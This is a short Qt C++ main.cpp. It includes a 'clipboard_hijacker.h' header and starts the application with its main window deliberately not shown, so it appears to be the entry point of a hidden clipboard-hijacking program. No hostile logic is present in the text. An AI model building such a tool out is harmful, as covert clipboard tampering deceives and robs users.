#include "mainwindow.h"
#include <QtGui>
#include <QLabel>
#include <QDebug>
#include <QApplication>
#include "clipboard_hijacker.h"
#include "screen_saver.h"
#include "unistd.h"
#include <QtTest/QTest>

int main(int argc, char *argv[])
{
    QApplication a(argc, argv);
    MainWindow w;

    //w.show();
    return a.exec();
}
